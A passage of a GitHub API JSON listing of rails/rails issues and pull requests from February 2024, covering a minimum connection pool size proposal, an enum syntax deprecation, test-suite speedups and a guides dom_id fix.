            "starred_url": "https://api.github.com/users/catlee/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/catlee/subscriptions",
            "organizations_url": "https://api.github.com/users/catlee/orgs",
            "repos_url": "https://api.github.com/users/catlee/repos",
            "events_url": "https://api.github.com/users/catlee/events{/privacy}",
            "received_events_url": "https://api.github.com/users/catlee/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": {
            "login": "matthewd",
            "id": 1034,
            "node_id": "MDQ6VXNlcjEwMzQ=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1034?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/matthewd",
            "html_url": "https://github.com/matthewd",
            "followers_url": "https://api.github.com/users/matthewd/followers",
            "following_url": "https://api.github.com/users/matthewd/following{/other_user}",
            "gists_url": "https://api.github.com/users/matthewd/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/matthewd/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/matthewd/subscriptions",
            "organizations_url": "https://api.github.com/users/matthewd/orgs",
            "repos_url": "https://api.github.com/users/matthewd/repos",
            "events_url": "https://api.github.com/users/matthewd/events{/privacy}",
            "received_events_url": "https://api.github.com/users/matthewd/received_events",
            "type": "User",
            "site_admin": true
        },
        "assignees": [
            {
                "login": "matthewd",
                "id": 1034,
                "node_id": "MDQ6VXNlcjEwMzQ=",
                "avatar_url": "https://avatars.githubusercontent.com/u/1034?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/matthewd",
                "html_url": "https://github.com/matthewd",
                "followers_url": "https://api.github.com/users/matthewd/followers",
                "following_url": "https://api.github.com/users/matthewd/following{/other_user}",
                "gists_url": "https://api.github.com/users/matthewd/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/matthewd/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/matthewd/subscriptions",
                "organizations_url": "https://api.github.com/users/matthewd/orgs",
                "repos_url": "https://api.github.com/users/matthewd/repos",
                "events_url": "https://api.github.com/users/matthewd/events{/privacy}",
                "received_events_url": "https://api.github.com/users/matthewd/received_events",
                "type": "User",
                "site_admin": true
            }
        ],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-06T22:01:44Z",
        "updated_at": "2024-02-09T19:48:25Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50990",
            "html_url": "https://github.com/rails/rails/pull/50990",
            "diff_url": "https://github.com/rails/rails/pull/50990.diff",
            "patch_url": "https://github.com/rails/rails/pull/50990.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis PR implements the minimum connection pool size idea described in #50989.\r\n\r\nThe primary motivation with this is to ensure that we always have at least _N_ connections established to the DB so that we don't need to spend time connecting to the DB during the handling of a request.\r\n\r\nFixes #50989\r\n\r\n### Detail\r\n\r\nIn `ConnectionPool`, rename `:size` to `:max_size`, and add `:min_size` as a configuration option. `:min_size` is initialized from `db_config.min_size`, where I've also added a new configuration option.\r\n\r\n`ConnectionPool#initialize` calls a new method, `ensure_minimum_connections` when `min_size` is > 0.\r\n\r\nIn `ConnectionPool#flush`, we need to pay attention to the minimum pool size, and make sure that we don't close too many connections.\r\n\r\nFinally, `ConnectionPool::Reaper` also calls into `ensure_minimum_connections` after reaping/flushing to ensure that we always have the desired number of established connections active.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50990/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50990/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50989",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50989/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50989/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50989/events",
        "html_url": "https://github.com/rails/rails/issues/50989",
        "id": 2121725445,
        "node_id": "I_kwDNIULOfnb2BQ",
        "number": 50989,
        "title": "Add the ability to configure minimum number of active connections for connection pool",
        "user": {
            "login": "catlee",
            "id": 54458,
            "node_id": "MDQ6VXNlcjU0NDU4",
            "avatar_url": "https://avatars.githubusercontent.com/u/54458?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/catlee",
            "html_url": "https://github.com/catlee",
            "followers_url": "https://api.github.com/users/catlee/followers",
            "following_url": "https://api.github.com/users/catlee/following{/other_user}",
            "gists_url": "https://api.github.com/users/catlee/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/catlee/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/catlee/subscriptions",
            "organizations_url": "https://api.github.com/users/catlee/orgs",
            "repos_url": "https://api.github.com/users/catlee/repos",
            "events_url": "https://api.github.com/users/catlee/events{/privacy}",
            "received_events_url": "https://api.github.com/users/catlee/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 41328116,
                "node_id": "MDU6TGFiZWw0MTMyODExNg==",
                "url": "https://api.github.com/repos/rails/rails/labels/attached%20PR",
                "name": "attached PR",
                "color": "006b75",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-06T21:49:42Z",
        "updated_at": "2024-02-08T10:19:51Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "Currently ActiveRecord connection pools support configuring a maximum size via the [`pool`](https://api.rubyonrails.org/classes/ActiveRecord/ConnectionAdapters/ConnectionPool.html#:~:text=database%20connection%20configuration%3A-,pool,-%3A%20maximum%20number%20of) configuration setting.\r\n\r\nEstablishing new connections to the DB can be a relatively expensive operation, and so we want to try and make sure that the application always has a minimum number of established connections to the DB. We can do that in our application's initialization path, but connections which have been idle for too long will get cleaned up by the reaper.\r\n\r\nI'd like to add support for specifying a minimum pool size to the connection pools so that we can ensure we always have a certain number of active connections to the DB established.\r\n\r\nAs a starting point, I propose the following changes:\r\n\r\n* [ ] Rename `size` to `max_size` in [`ConnectionPool`](https://api.rubyonrails.org/classes/ActiveRecord/ConnectionAdapters/ConnectionPool.html)\r\n* [ ] Alias `size` to `max_size` for backwards compatibility\r\n* [ ] Add `min_size` as a supported option to [`ActiveRecord::DatabaseConfigurations::HashConfig`](https://api.rubyonrails.org/classes/ActiveRecord/DatabaseConfigurations/HashConfig.html)\r\n* [ ] Optionally rename `pool` to `max_size` for clarity, and add an alias for `pool` for backwards compat\r\n* [ ] Modify `ConnectionPool` and `ConnectionPool::Reaper` to respect the minimum pool size\r\n\r\nI will add a PR that implements these ideas.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50989/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50989/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50988",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50988/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50988/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50988/events",
        "html_url": "https://github.com/rails/rails/pull/50988",
        "id": 2121564306,
        "node_id": "PR_kwDNIULOZi94GA",
        "number": 50988,
        "title": "Improve `dom_id` uniqueness in guides",
        "user": {
            "login": "p8",
            "id": 28561,
            "node_id": "MDQ6VXNlcjI4NTYx",
            "avatar_url": "https://avatars.githubusercontent.com/u/28561?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/p8",
            "html_url": "https://github.com/p8",
            "followers_url": "https://api.github.com/users/p8/followers",
            "following_url": "https://api.github.com/users/p8/following{/other_user}",
            "gists_url": "https://api.github.com/users/p8/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/p8/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/p8/subscriptions",
            "organizations_url": "https://api.github.com/users/p8/orgs",
            "repos_url": "https://api.github.com/users/p8/repos",
            "events_url": "https://api.github.com/users/p8/events{/privacy}",
            "received_events_url": "https://api.github.com/users/p8/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-02-06T19:56:21Z",
        "updated_at": "2024-02-08T19:03:11Z",
        "closed_at": "2024-02-08T18:38:10Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50988",
            "html_url": "https://github.com/rails/rails/pull/50988",
            "diff_url": "https://github.com/rails/rails/pull/50988.diff",
            "patch_url": "https://github.com/rails/rails/pull/50988.patch",
            "merged_at": "2024-02-08T18:38:10Z"
        },
        "body": "All headers in a guide get a unique `dom_id` to make anchor links work.\r\nIf a header is already present we would prefix it (and it's duplicate) with the `dom_id` of the parent node.\r\nThis would raise an error for headers without parent nodes:\r\n\r\n```\r\n../rails/guides/rails_guides/markdown.rb:47:in `dom_id': undefined method `[]' for nil:NilClass (NoMethodError)\r\n\r\n          dom_id = \"#{nodes[-2][:id]}-#{dom_id}\"\r\n```\r\n\r\nThis commit simplifies the `dom_id` uniqueness by only prepending the\r\nparent node if it exists. This can still result in duplicates at the\r\nsame level, but for these we already show a warning:\r\n\r\n    *** DUPLICATE ID: \"some_id\", please make sure that there are no headings with the same name at the same level.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50988/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50988/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50987",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50987/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50987/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50987/events",
        "html_url": "https://github.com/rails/rails/pull/50987",
        "id": 2121374684,
        "node_id": "PR_kwDNIULOZizdsw",
        "number": 50987,
        "title": "Deprecate defining enums with keywords args",
        "user": {
            "login": "skipkayhil",
            "id": 6014046,
            "node_id": "MDQ6VXNlcjYwMTQwNDY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6014046?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/skipkayhil",
            "html_url": "https://github.com/skipkayhil",
            "followers_url": "https://api.github.com/users/skipkayhil/followers",
            "following_url": "https://api.github.com/users/skipkayhil/following{/other_user}",
            "gists_url": "https://api.github.com/users/skipkayhil/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/skipkayhil/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/skipkayhil/subscriptions",
            "organizations_url": "https://api.github.com/users/skipkayhil/orgs",
            "repos_url": "https://api.github.com/users/skipkayhil/repos",
            "events_url": "https://api.github.com/users/skipkayhil/events{/privacy}",
            "received_events_url": "https://api.github.com/users/skipkayhil/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-06T17:52:31Z",
        "updated_at": "2024-02-12T15:57:39Z",
        "closed_at": "2024-02-10T01:32:13Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50987",
            "html_url": "https://github.com/rails/rails/pull/50987",
            "diff_url": "https://github.com/rails/rails/pull/50987.diff",
            "patch_url": "https://github.com/rails/rails/pull/50987.patch",
            "merged_at": "2024-02-10T01:32:13Z"
        },
        "body": "### Motivation / Background\r\n\r\nEnums have historically been defined using keyword arguments:\r\n\r\n```ruby\r\nclass Function > ApplicationRecord\r\n  enum color: [:red, :blue],\r\n       type: [:instance, :class],\r\n       _scopes: false\r\n```\r\n\r\nThis has the advantage of being able to define multiple enums at once with the same options. However, it also has a downside that enum options must be prefixed with an underscore to separate them from the enum definitions (to enable models to have enums with the same name as an option).\r\n\r\nIn Rails 7, a new syntax was [introduced][1] to instead define enums with positional arguments:\r\n\r\n```ruby\r\nclass Function > ApplicationRecord\r\n  enum :color, [:red, :blue], scopes: false\r\n  enum :type, [:instance, :class], scopes: false\r\n```\r\n\r\nThis new syntax eliminates the need to prefix options with an underscore, and the docs were updated to recommend this new syntax.\r\n\r\nHowever, both versions of the API have been supported since, and it has started to cause some problems:\r\n\r\nThe first issue is that the available options have drifted. In Rails 7.1, an option was added to make assigning an invalid enum value use validation errors instead of runtime errors. However, the equivalent underscored prefix option was not added for the original enum syntax\r\n\r\nArticles have been created that describe the new option in Rails 7.1, but the examples in the articles use un-prefixed options with the old syntax. This confusion has also lead to issues opened asking why that incorrect syntax is not working.\r\n\r\nAdditionally, the presence of underscored options is just generally confusing because it tends to imply an option is for internal use.\r\n\r\n### Detail\r\n\r\nThis commit aims to fix all of these issues by deprecating the old enum syntax. With only one way to define enums, options cannot drift and there will be less confusion around how enums should be defined.\r\n\r\n[1]: https://github.com/rails/rails/commit/0618d2d84a501aea93c898aec504ff9a0e09d6f2\r\n\r\n### Additional information\r\n\r\nCloses #50333\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50987/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50987/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50986",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50986/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50986/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50986/events",
        "html_url": "https://github.com/rails/rails/pull/50986",
        "id": 2121298832,
        "node_id": "PR_kwDNIULOZivUMg",
        "number": 50986,
        "title": "Delete `EncryptionPerformanceTest`",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-06T17:09:09Z",
        "updated_at": "2024-02-07T12:43:41Z",
        "closed_at": "2024-02-06T17:33:06Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50986",
            "html_url": "https://github.com/rails/rails/pull/50986",
            "diff_url": "https://github.com/rails/rails/pull/50986.diff",
            "patch_url": "https://github.com/rails/rails/pull/50986.patch",
            "merged_at": "2024-02-06T17:33:05Z"
        },
        "body": "On my machine, running the whole Active Record test suite takes `88` seconds, and `40` of these are spent in encryption tests.\r\n\r\nSome of them also happen to occasionally flake because of random blips.\r\n\r\nI appreciate the care that has been put into ensuring the overhead of encryption is reasonable, but I don't think these tests justify their cost.\r\n\r\nBefore:\r\n```\r\nFinished in 87.492219s, 99.8374 runs/s, 339.1844 assertions/s.\r\n8735 runs, 29676 assertions, 0 failures, 0 errors, 33 skips\r\n\r\nYou have skipped tests. Run with --verbose for details.\r\n\r\nTop 10 slowest tests (47.51 seconds, 54.5% of total time):\r\n  ActiveRecord::Encryption::EncryptionPerformanceTest#test_reading_an_encrypted_attribute_multiple_times_is_as_fast_as_reading_a_regular_attribute\r\n    8.3918 seconds test/cases/encryption/performance/encryption_performance_test.rb:22\r\n  ActiveRecord::Encryption::EnvelopeEncryptionPerformanceTest#test_reading_an_encrypted_attribute_multiple_times_is_as_fast_as_reading_a_regular_attribute\r\n    8.3016 seconds test/cases/encryption/performance/envelope_encryption_performance_test.rb:24\r\n  ActiveRecord::Encryption::ExtendedDeterministicQueriesPerformanceTest#test_finding_with_prepared_statement_caching_by_deterministically_encrypted_columns\r\n    6.5172 seconds test/cases/encryption/performance/extended_deterministic_queries_performance_test.rb:7\r\n  ActiveRecord::Encryption::ExtendedDeterministicQueriesPerformanceTest#test_finding_without_prepared_statement_caching_by_encrypted_columns_(deterministic)\r\n    6.4302 seconds test/cases/encryption/performance/extended_deterministic_queries_performance_test.rb:15\r\n  EagerLoadingTooManyIdsTest#test_preloading_too_many_ids\r\n    4.5818 seconds test/cases/associations/eager_test.rb:42\r\n  ActiveRecord::Encryption::EncryptionPerformanceTest#test_performance_when_saving_records\r\n    4.1761 seconds test/cases/encryption/performance/encryption_performance_test.rb:14\r\n  ActiveRecord::Encryption::EnvelopeEncryptionPerformanceTest#test_performance_when_saving_records\r\n    4.1314 seconds test/cases/encryption/performance/envelope_encryption_performance_test.rb:14\r\n  SecurePasswordTest#test_authenticate_by_takes_the_same_amount_of_time_regardless_of_whether_record_is_found\r\n    2.7296 seconds test/cases/secure_password_test.rb:27\r\n  ActiveRecord::ConnectionAdapters::ConnectionPoolThreadTest#test_disconnect_and_clear_reloadable_connections_attempt_to_wait_for_threads_to_return_their_conns\r\n    1.2350 seconds test/cases/connection_pool_test.rb:661\r\n  ActiveRecord::ConnectionAdapters::SchemaCacheTest#test_gzip_dumps_identical\r\n    1.0193 seconds test/cases/connection_adapters/schema_cache_test.rb:298\r\n\r\n```\r\n\r\nAfter:\r\n\r\n```\r\nFinished in 48.428584s, 180.1828 runs/s, 612.1591 assertions/s.\r\n8726 runs, 29646 assertions, 0 failures, 0 errors, 33 skips\r\n\r\nYou have skipped tests. Run with --verbose for details.\r\n\r\nTop 10 slowest tests (11.88 seconds, 24.7% of total time):\r\n  EagerLoadingTooManyIdsTest#test_eager_loading_too_many_ids\r\n    3.8527 seconds test/cases/associations/eager_test.rb:46\r\n  SecurePasswordTest#test_authenticate_by_takes_the_same_amount_of_time_regardless_of_whether_record_is_found\r\n    2.6805 seconds test/cases/secure_password_test.rb:27\r\n  ActiveRecord::ConnectionAdapters::ConnectionPoolThreadTest#test_disconnect_and_clear_reloadable_connections_attempt_to_wait_for_threads_to_return_their_conns\r\n    1.2267 seconds test/cases/connection_pool_test.rb:661\r\n  ActiveRecord::ConnectionAdapters::SchemaCacheTest#test_gzip_dumps_identical\r\n    1.0150 seconds test/cases/connection_adapters/schema_cache_test.rb:298\r\n  EagerLoadingTooManyIdsTest#test_preloading_too_many_ids\r\n    0.7487 seconds test/cases/associations/eager_test.rb:42\r\n  ActiveRecord::ConnectionAdapters::ConnectionPoolThreadTest#test_checkout_fairness\r\n    0.5638 seconds test/cases/connection_pool_test.rb:416\r\n  ActiveRecord::ConnectionAdapters::ConnectionPoolThreadTest#test_checkout_fairness_by_group\r\n    0.5585 seconds test/cases/connection_pool_test.rb:463\r\n  ActiveRecord::ConnectionAdapters::ConnectionPoolThreadTest#test_connection_pool_stat\r\n    0.4181 seconds test/cases/connection_pool_test.rb:774\r\n  ActiveRecord::ConnectionAdapters::ConnectionPoolFiberTest#test_connection_pool_stat\r\n    0.4074 seconds test/cases/connection_pool_test.rb:774\r\n  ActiveRecord::ConnectionAdapters::ConnectionPoolThreadTest#test_concurrent_connection_establishment\r\n    0.4066 seconds test/cases/connection_pool_test.rb:609\r\n```",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50986/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50986/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50985",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50985/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50985/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50985/events",
        "html_url": "https://github.com/rails/rails/pull/50985",
        "id": 2121222831,
        "node_id": "PR_kwDNIULOZirInQ",
        "number": 50985,
        "title": "Speedup ConnectionPoolTests",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-06T16:34:52Z",
        "updated_at": "2024-02-06T16:46:55Z",
        "closed_at": "2024-02-06T16:46:54Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50985",
            "html_url": "https://github.com/rails/rails/pull/50985",
            "diff_url": "https://github.com/rails/rails/pull/50985.diff",
            "patch_url": "https://github.com/rails/rails/pull/50985.patch",
            "merged_at": "2024-02-06T16:46:54Z"
        },
        "body": "Most of the time was spent waiting on the default 5 seconds checkout timeout.\r\n\r\nReducing in for just these tests saves about 1 minute of run time but more importantly saves me from trying to figure out if my refactoring introduced a deadlock of some sort.\r\n\r\nBefore: `real\t1m4.448s`\r\n\r\nAfter: `real\t0m6.395s`\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50985/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50985/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50984",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50984/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50984/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50984/events",
        "html_url": "https://github.com/rails/rails/pull/50984",
        "id": 2120988663,
        "node_id": "PR_kwDNIULOZiePdA",
        "number": 50984,
        "title": "Implement `Rails::TestUnitReporter#prerecord`",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-06T14:56:12Z",
        "updated_at": "2024-02-06T15:58:11Z",
        "closed_at": "2024-02-06T15:58:11Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50984",
            "html_url": "https://github.com/rails/rails/pull/50984",
            "diff_url": "https://github.com/rails/rails/pull/50984.diff",
            "patch_url": "https://github.com/rails/rails/pull/50984.patch",
            "merged_at": "2024-02-06T15:58:11Z"
        },
        "body": "This is invoked by Minitest before invoking the test, allowing to print the test name in advance.\r\n\r\nThis is useful to debug slow and stuck tests by turning on verbose mode. This way the stuck test name is printed before the process deadlock.\r\n\r\nOtherwise you have to resort to dirty tricks to figure out which test is not returning.\r\n\r\nThis is also how the default Minitest reporter works in verbose mode.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50984/reactions",
            "total_count": 2,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50984/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50983",
